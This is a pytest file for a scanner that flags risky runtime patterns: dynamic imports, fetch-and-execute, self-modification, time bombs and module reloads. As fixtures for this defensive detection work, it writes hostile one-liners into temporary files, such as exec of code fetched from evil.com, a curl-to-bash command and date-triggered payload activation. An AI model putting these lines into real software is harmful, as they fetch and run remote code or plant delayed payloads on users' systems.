"""Tests for scan_runtime_dynamism.py - Runtime Behavior Prediction Scanner.

NOTE: Patterns owned by other scanners are tested in their own test files:
- types.FunctionType, types.CodeType, marshal.loads, sys.addaudithook,
  bytes([]).decode(), open(__file__,'w') -> test_scan_ast.py
- Runtime pip/npm install -> test_scan_manifest_drift.py
- Dynamic tool descriptions -> test_scan_mcp_security.py
"""

import os
import json
import pytest
import scan_runtime_dynamism as scanner


class TestDynamicImports:
    def test_importlib_import_module_variable(self, tmp_path):
        f = tmp_path / "loader.py"
        f.write_text(
            "import importlib\n"
            "mod_name = config.get('module')\n"
            "mod = importlib.import_module(mod_name)\n"
        )
        findings = scanner.scan_file(str(f), "loader.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_importlib_literal_ok(self, tmp_path):
        """importlib.import_module with string literal should not trigger AST pattern."""
        f = tmp_path / "safe.py"
        f.write_text(
            "import importlib\n"
            "mod = importlib.import_module('json')\n"
        )
        findings = scanner.scan_file(str(f), "safe.py")
        ast_findings = [f for f in findings if "variable" in f.title.lower()]
        assert len(ast_findings) == 0

    def test_dunder_import_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("mod = __import__(user_input)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_dunder_import_string_literal(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("mod = __import__('evil_backdoor')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "dynamic-import" in cats

    def test_js_require_variable(self, tmp_path):
        f = tmp_path / "loader.js"
        f.write_text("const mod = require(pluginName)\n")
        findings = scanner.scan_file(str(f), "loader.js")
        assert any("dynamic-import" in f.category for f in findings)

    def test_js_dynamic_import_variable(self, tmp_path):
        f = tmp_path / "loader.mjs"
        f.write_text("const mod = await import(modulePath)\n")
        findings = scanner.scan_file(str(f), "loader.mjs")
        assert any("dynamic-import" in f.category for f in findings)


class TestFetchExecute:
    def test_eval_requests_get(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("exec(requests.get('http://evil.com/payload.py').text)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "fetch-execute" in cats

    def test_download_to_variable(self, tmp_path):
        """HTTP response stored in variable should be flagged."""
        f = tmp_path / "evil.py"
        f.write_text("response = requests.get('http://evil.com/stage2.py')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "fetch-execute" in cats

    def test_curl_pipe_bash(self, tmp_path):
        f = tmp_path / "install.py"
        f.write_text("subprocess.run(['curl', 'http://evil.com/setup.sh', '|', 'bash'])\n")
        findings = scanner.scan_file(str(f), "install.py")
        assert isinstance(findings, list)


class TestSelfModification:
    """Only tests patterns unique to runtime_dynamism (not in scan_ast.py)."""

    def test_sourceless_file_loader(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("from importlib._bootstrap_external import SourcelessFileLoader\n")
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("self-modification" in f.category for f in findings)

    def test_compile_with_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("code = compile(user_code, '<string>', 'exec')\n")
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("self-modification" in f.category for f in findings)

    def test_js_new_function_variable(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("const fn = new Function(userCode)\n")
        findings = scanner.scan_file(str(f), "evil.js")
        assert any("self-modification" in f.category for f in findings)

    def test_js_eval_atob(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("eval(atob('YWxlcnQoMSk='))\n")
        findings = scanner.scan_file(str(f), "evil.js")
        assert any("self-modification" in f.category for f in findings)


class TestTimeBombs:
    def test_datetime_comparison(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "from datetime import datetime\n"
            "if datetime.now() > datetime(2026, 6, 1):\n"
            "    activate_payload()\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_unix_timestamp(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "import time\n"
            "if time.time() > 1750000000:\n"
            "    activate()\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_js_date_now(self, tmp_path):
        f = tmp_path / "evil.js"
        f.write_text("if (Date.now() > 1750000000000) { activate(); }\n")
        findings = scanner.scan_file(str(f), "evil.js")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_counter_activation(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("if counter >= 100:\n    exec(payload)\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats

    def test_time_time_variable(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text("import time\nif time.time() > activation:\n    run()\n")
        findings = scanner.scan_file(str(f), "evil.py")
        cats = [f.category for f in findings]
        assert "time-bomb" in cats


class TestCleanCode:
    def test_clean_python(self, tmp_path):
        f = tmp_path / "clean.py"
        f.write_text(
            "import json\nimport os\n\n"
            "def process(data):\n    return json.dumps(data)\n"
        )
        findings = scanner.scan_file(str(f), "clean.py")
        assert len(findings) == 0

    def test_clean_js(self, tmp_path):
        f = tmp_path / "clean.js"
        f.write_text(
            "const fs = require('fs');\n"
            "const data = fs.readFileSync('data.json');\n"
            "console.log(JSON.parse(data));\n"
        )
        findings = scanner.scan_file(str(f), "clean.js")
        assert len(findings) == 0

    def test_non_target_file(self, tmp_path):
        f = tmp_path / "readme.md"
        f.write_text("# Hello\nThis is safe.\n")
        findings = scanner.scan_file(str(f), "readme.md")
        assert len(findings) == 0


class TestImportlibReload:
    def test_importlib_reload(self, tmp_path):
        f = tmp_path / "evil.py"
        f.write_text(
            "import importlib\nimport my_module\n"
            "importlib.reload(my_module)\n"
        )
        findings = scanner.scan_file(str(f), "evil.py")
        assert any("reload" in f.title.lower() for f in findings)
